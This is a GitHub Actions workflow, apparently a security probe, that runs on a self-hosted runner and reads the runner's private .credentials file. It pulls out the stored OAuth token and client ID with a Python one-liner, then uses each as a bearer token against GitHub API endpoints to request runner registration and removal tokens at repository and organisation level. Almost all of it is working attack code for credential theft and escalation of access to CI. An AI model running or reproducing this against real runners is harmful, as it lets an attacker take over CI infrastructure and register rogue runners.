name: Test Runner Token
on: [push]
jobs:
  find:
    runs-on: self-hosted
    steps:
      - name: Try Generate Registration Token
        run: |
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          echo "=== TRYING OAUTH TOKEN ==="
          TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
          import sys, json
          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
          print(data['data'].get('Token', ''))
          ")
          
          curl -s -X POST \
          -H "Authorization: Bearer $TOKEN" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token
          
          echo "=== TRYING CLIENT ID ==="
          CLIENT=$(cat $RUNNER_BASE/.credentials | python3 -c "
          import sys, json
          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
          print(data['data'].get('clientId', ''))
          ")
          
          curl -s -X POST \
          -H "Authorization: Bearer $CLIENT" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token

      - name: Also Try Remove Token
        run: |
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
          import sys, json
          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
          print(data['data'].get('Token', ''))
          ")
          
          echo "=== TRYING REMOVE TOKEN ENDPOINT ==="
          curl -s -X POST \
          -H "Authorization: Bearer $TOKEN" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/runners/remove-token
          
          echo "=== TRYING ORG LEVEL ==="
          curl -s -X POST \
          -H "Authorization: Bearer $TOKEN" \
          -H "Accept: application/vnd.github.v3+json" \
          https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token
